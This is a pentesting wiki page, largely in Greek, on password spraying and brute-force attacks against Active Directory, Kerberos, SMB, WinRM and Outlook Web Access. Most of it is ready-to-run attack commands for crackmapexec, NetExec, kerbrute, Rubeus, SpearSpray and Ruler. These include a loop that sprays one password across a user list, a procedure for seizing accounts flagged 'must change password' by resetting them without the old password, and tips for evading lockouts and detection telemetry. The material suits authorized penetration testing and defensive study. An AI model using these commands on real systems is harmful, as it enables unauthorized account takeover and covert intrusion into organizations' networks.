# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Μόλις βρείτε αρκετά **έγκυρα ονόματα χρηστών** μπορείτε να δοκιμάσετε τους πιο **συνηθισμένους κωδικούς πρόσβασης** (να έχετε κατά νου την πολιτική κωδικών του περιβάλλοντος) για κάθε έναν από τους ανακαλυφθέντες χρήστες.\
Από **προεπιλογή** το **ελάχιστο** **μήκος** **κωδικού** είναι **7**.

Λίστες με κοινά ονόματα χρηστών μπορεί επίσης να είναι χρήσιμες: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Σημειώστε ότι **ορισμένοι λογαριασμοί μπορεί να κλειδωθούν αν δοκιμάσετε πολλούς λάθος κωδικούς** (από **προεπιλογή** πάνω από 10).

### Λήψη πολιτικής κωδικών

Εάν έχετε κάποια user credentials ή ένα shell ως domain user, μπορείτε να **λάβετε την πολιτική κωδικών με**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Εκμετάλλευση από Linux (ή όλα)

- Χρήση του **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Χρησιμοποιώντας **NetExec (CME successor)** για στοχευμένο, χαμηλού θορύβου spraying μέσω SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Χρησιμοποιώντας [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(μπορείτε να καθορίσετε τον αριθμό προσπαθειών για να αποφύγετε lockouts):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Χρησιμοποιώντας [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - ΔΕΝ ΣΥΝΙΣΤΑΤΑΙ — ΜΕΡΙΚΕΣ ΦΟΡΕΣ ΔΕΝ ΛΕΙΤΟΥΡΓΕΙ
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Με το `scanner/smb/smb_login` module του **Metasploit**:

![](<../../images/image (745).png>)

- Χρησιμοποιώντας **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Από τα Windows

- Με την έκδοση του [Rubeus](https://github.com/Zer1t0/Rubeus) που περιλαμβάνει το brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Με [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Μπορεί να δημιουργήσει users από το domain από προεπιλογή και θα πάρει το password policy από το domain και θα περιορίσει τις προσπάθειες σύμφωνα με αυτό):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Με [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Εντοπισμός και Κατάληψη "Password must change at next logon" Accounts (SAMR)

Μια τεχνική με χαμηλό θόρυβο είναι να κάνετε spray ένα benign/empty password και να εντοπίσετε λογαριασμούς που επιστρέφουν STATUS_PASSWORD_MUST_CHANGE, κάτι που υποδεικνύει ότι ο κωδικός έχει εξαναγκαστικά λήξει και μπορεί να αλλάξει χωρίς να γνωρίζετε τον παλιό.

Workflow:
- Καταγράψτε χρήστες (RID brute via SAMR) για να δημιουργήσετε τη λίστα στόχων:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray ένα κενό password και συνέχισε μετά από επιτυχίες για να αποκτήσεις λογαριασμούς που πρέπει να αλλάξουν κατά την επόμενη σύνδεση:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Για κάθε hit, αλλάξτε το password μέσω SAMR με το NetExec’s module (δεν απαιτείται ο old password όταν είναι ρυθμισμένο το "must change"):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Σημειώσεις λειτουργίας:
- Βεβαιωθείτε ότι το ρολόι του host σας είναι συγχρονισμένο με τον DC πριν από Kerberos-based operations: `sudo ntpdate <dc_fqdn>`.
- Ένα [+] χωρίς (Pwn3d!) σε ορισμένα modules (π.χ., RDP/WinRM) σημαίνει ότι τα creds είναι έγκυρα αλλά ο λογαριασμός στερείται δικαιωμάτων interactive logon.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying με LDAP στοχοποίηση και PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying μειώνει τον θόρυβο σε σχέση με τις SMB/NTLM/LDAP bind attempts και ευθυγραμμίζεται καλύτερα με τις AD lockout πολιτικές. Το SpearSpray συνδυάζει LDAP-driven στοχοποίηση, έναν pattern engine και policy awareness (domain policy + PSOs + badPwdCount buffer) για να πραγματοποιεί spraying με ακρίβεια και ασφάλεια. Μπορεί επίσης να ετικετοποιήσει compromised principals στο Neo4j για BloodHound pathing.

Key ideas:
- LDAP user discovery με paging και υποστήριξη LDAPS, προαιρετικά χρησιμοποιώντας custom LDAP filters.
- Domain lockout policy + PSO-aware filtering ώστε να αφήνει διαμορφώσιμο attempt buffer (threshold) και να αποφεύγει το κλείδωμα χρηστών.
- Kerberos pre-auth validation χρησιμοποιώντας fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
- Pattern-based, per-user password generation χρησιμοποιώντας μεταβλητές όπως ονόματα και temporal values που προκύπτουν από το pwdLastSet κάθε χρήστη.
- Throughput control με threads, jitter, και max requests per second.
- Προαιρετική ενσωμάτωση Neo4j για να σηματοδοτεί owned users για BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Στόχευση και έλεγχος μοτίβων:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Έλεγχοι Stealth και ασφάλειας:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound εμπλουτισμός:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Επισκόπηση συστήματος προτύπων (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Διαθέσιμες μεταβλητές περιλαμβάνουν:
- {name}, {samaccountname}
- Χρονικά από το pwdLastSet κάθε χρήστη (ή whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Βοηθήματα σύνθεσης και org token: {separator}, {suffix}, {extra}

Λειτουργικές σημειώσεις:
- Προτιμήστε να ερωτάτε τον PDC-emulator με -dc για να διαβάσετε τις πιο αυθεντικές τιμές badPwdCount και πληροφορίες σχετικές με policy.
- Οι επαναρυθμίσεις του badPwdCount ενεργοποιούνται στην επόμενη προσπάθεια μετά το observation window· χρησιμοποιήστε threshold και timing για να παραμείνετε ασφαλείς.
- Οι Kerberos pre-auth attempts εμφανίζονται ως 4768/4771 στην DC telemetry· χρησιμοποιήστε jitter και rate-limiting για να blend in.

> Συμβουλή: Το default LDAP page size του SpearSpray είναι 200· ρυθμίστε με -lps όπως απαιτείται.

## Outlook Web Access

Υπάρχουν πολλά εργαλεία για p**assword spraying outlook**.

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Για να χρησιμοποιήσετε οποιοδήποτε από αυτά τα εργαλεία, χρειάζεστε λίστα χρηστών και ένα password / μια μικρή λίστα με passwords για να spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Αναφορές

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
